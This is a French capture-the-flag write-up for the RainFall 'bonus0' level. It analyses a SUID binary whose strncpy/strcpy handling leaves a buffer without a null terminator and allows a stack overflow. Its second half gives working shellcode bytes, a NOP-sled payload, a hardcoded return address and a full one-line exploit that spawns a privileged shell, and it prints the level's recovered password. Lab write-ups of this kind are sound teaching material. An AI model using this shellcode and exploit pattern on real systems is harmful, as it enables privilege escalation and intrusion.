# BONUS0

Le système de fichier se présente de cette manière :

```diff
bonus0@RainFall:~$ ls -la

total 17

dr-xr-x---+ 1 bonus0 bonus0   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
rw-r--r--  1 bonus0 bonus0  220 Apr  3  2012 .bash_logout
rw-r--r--  1 bonus0 bonus0 3530 Sep 23  2015 .bashrc
+rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0
rw-r--r--+ 1 bonus0 bonus0   65 Sep 23  2015 .pass
rw-r--r-- 1 bonus0 bonus0  675 Apr  3  2012 .profile
```

Le binaire `bonus0` possède le SUID et appartient à `bonus1`.

Il s'exécute donc avec les privilèges de `bonus1`.

## Analyse

Le programme contient trois fonctions principales :

* `main()`
* `pp()`
* `p()`

### Fonction `p()`

La fonction `p()` possède un buffer local de `4104` octets et lit jusqu'à `4096` octets depuis l'entrée standard.

```c
void p(char *dest, char *prompt)
{
    char buffer[4104];

    puts(prompt);
    read(0, buffer, 4096);
    *strchr(buffer, '\n') = '\0';
    strncpy(dest, buffer, 20);
}
```

Après le `read()`, le programme cherche le premier `\n` avec :

```c
strchr(buffer, '\n')
```

puis le remplace par `\0`.

Enfin, seuls les `20` premiers caractères sont copiés dans `dest` avec :

```c
strncpy(dest, buffer, 20);
```

La fonction `p()` ne vérifie donc pas réellement la longueur de l'entrée avant le `read()`. Cependant, le dépassement intéressant ne se produit pas directement dans `p()`, mais dans la manière dont les données sont ensuite utilisées par `pp()`.

---

### Fonction `pp()`

La fonction `pp()` utilise deux buffers locaux de `20` octets :

```c
void pp(char *dest)
{
    char buffer1[20];
    char buffer2[20];
    size_t len;

    p(buffer1, " - ");
    p(buffer2, " - ");

    strcpy(dest, buffer1);

    len = strlen(dest);
    dest[len] = ' ';
    dest[len + 1] = '\0';

    strcat(dest, buffer2);
}
```

Les deux appels à `p()` remplissent `buffer1` puis `buffer2`.

D'après le désassemblage :

```asm
lea eax,[ebp-0x30]
...
call p

lea eax,[ebp-0x1c]
...
call p
```

on retrouve :

```text
buffer1 = ebp - 0x30
buffer2 = ebp - 0x1c
```

La différence entre les deux adresses est :

```text
0x30 - 0x1c = 0x14
```

soit `20` octets.

Les deux buffers sont donc placés consécutivement en mémoire.

---

## Vulnérabilité

Le problème principal vient de :

```c
strcpy(dest, buffer1);
```

`strcpy()` continue de copier jusqu'à rencontrer un caractère `\0`.

Or, dans `p()`, on utilise :

```c
strncpy(dest, buffer, 20);
```

Si l'entrée contient exactement `20` caractères, `strncpy()` peut remplir complètement le buffer sans ajouter de `\0`.

`buffer1` ne possède alors pas forcément de terminateur nul.

Lorsque `strcpy()` commence à copier `buffer1`, il continue donc à lire les octets qui se trouvent après `buffer1` en mémoire.

Comme `buffer2` se trouve juste après, les données peuvent être récupérées au-delà de `buffer1` et utilisées pour construire une chaîne plus longue que la taille prévue du buffer de destination.

Cette chaîne est ensuite complétée par :

```c
strcat(dest, buffer2);
```

Le résultat permet finalement de dépasser le buffer de `main()` et d'écraser l'adresse de retour de la fonction.

---

## Buffer de `main()`

Le désassemblage de `main()` montre :

```asm
sub esp,0x40
lea eax,[esp+0x16]
...
call pp
```

Le buffer utilisé par `pp()` commence donc à `esp + 0x16`.

Dans notre reconstruction :

```c
int main(void)
{
    char buffer[54];

    pp(buffer);
    puts(buffer);

    return 0;
}
```

Le but est donc de faire écrire `pp()` au-delà de ce buffer jusqu'à atteindre l'adresse de retour de `main()`.

---

# Exploitation

L'exploitation repose sur deux éléments :

1. placer un shellcode dans la mémoire du processus ;
2. remplacer l'adresse de retour par une adresse qui pointe vers ce shellcode.

## Shellcode

On utilise un shellcode de `34` octets permettant d'exécuter `/bin/sh` :

```text
\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80
\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3
\x89\xd1\xcd\x80
```

---

## NOP sled

Pour faciliter le retour vers le shellcode, on place un NOP sled avant celui-ci :

```text
\x90
```

Le premier input contient donc :

```text
50 × "A"
100 × "\x90"
shellcode
```

Le shellcode est ainsi placé dans le buffer local utilisé par `p()`.

Même si `p()` ne copie que les `20` premiers caractères vers `buffer1`, le contenu complet de l'entrée reste présent dans son buffer local sur la pile.

On peut donc ensuite essayer de faire retourner l'exécution vers cette zone mémoire.

Avec GDB, l'adresse utilisée pour atteindre le NOP sled a été déterminée à :

```text
0xbfffe640
```

En little endian, cette adresse devient :

```text
\x40\xe6\xff\xbf
```

---

## Deuxième input

Le deuxième input sert à construire le débordement et à remplacer l'adresse de retour.

On utilise notamment :

```text
BBBBCCCCD
\x40\xe6\xff\xbf
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
```

L'adresse `0xbfffe640` est donc placée dans le payload afin que l'exécution retourne dans la zone contenant le NOP sled et le shellcode.

Le comportement recherché est alors :

```text
adresse de retour
        ↓
0xbfffe640
        ↓
NOP sled
        ↓
shellcode
        ↓
/bin/sh
```

---

## Exploit final

```bash
(echo "$(python2 -c 'import sys; sys.stdout.write("A" * 50 + "\x90" * 100 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\n" + "A")')" && (echo "$(python2 -c 'import sys; sys.stdout.write("BBBBCCCCD" + "\x40\xe6\xff\xbf" + "B" * 30 + "\n" + "B")')"); cat) | ./bonus0
```

On obtient un shell avec les privilèges de `bonus1` :

```text
uid=2011(bonus1) gid=2010(bonus0) egid=100(users)
groups=2011(bonus1),100(users),2010(bonus0)
```

On peut alors récupérer le mot de passe :

```bash
cat /home/user/bonus1/.pass
```

```text
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
